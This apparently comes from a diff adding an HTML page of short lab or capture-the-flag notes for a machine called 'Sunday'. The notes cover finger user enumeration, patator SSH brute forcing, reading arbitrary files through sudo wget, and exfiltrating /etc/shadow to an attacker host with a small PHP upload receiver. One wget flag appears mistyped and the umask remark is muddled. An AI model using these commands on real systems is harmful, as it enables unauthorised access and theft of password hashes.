@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Sunday - Finger SSH Algorithms</title>
+</head><body>Enumerating finger:<br/>
+&nbsp;&#09;github.com/pentestmonkey/finger-user-enum<br/>
+&nbsp;&#09;msf: auxiliary/scanner/finger/finger_users<br/>
+<br/>
+if ssh has no key exchange method found, there's a flag for that:<br/>
+ssh -okexAlgorithms=+&lt;algorithm&gt;<br/>
+ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 &lt;user&gt;@host<br/>
+<br/>
+Hydra doesn't work here...so let's use patator<br/>
+github.com/lanjelot/patator<br/>
+<br/>
+patator ssh_login host=&lt;RHOST&gt; port=&lt;RPORT&gt; user=&lt;USER&gt; password=FILE0 0=&lt;PASS_FILE&gt; persistent=0 -x ignore:mesg='Authentication failed.'<br/>
+<br/>
+sudo wget -i &lt;file&gt; 2&gt;&amp;1 | awk '{print $4}'<br/>
+Allows you to read any file (stderr to stdout for awk to get rid of errors that wget prints)<br/>
+<br/>
+<br/>
+<br/>
+Auxiliary fun stuff<br/>
+Just like with curl and olympus, we can use wget to post files to an exfil server<br/>
+sudo wget --port-file=/etc/shadow &lt;LHOST&gt;/upload.php?filename=shadow<br/>
+<br/>
+upload.php script to handle the connections:<br/>
+&lt;?php <br/>
+$fname = basename($_REQUEST['filename']);<br/>
+file_put_contents('upload/' . $fname, &nbsp;file_get_contents('php://input'));<br/>
+?&gt;<br/>
+<br/>
+new user for security:<br/>
+useradd ipp<br/>
+chown ipp upload<br/>
+su - ipp<br/>
+<br/>
+umask settings - inverse of 777 and applies it to new files on the system<br/>
+umask 555<br/>
+<br/>
+now start the server<br/>
+php -S &lt;LHOST&gt;:&lt;LPORT&gt; -t .</body></html>
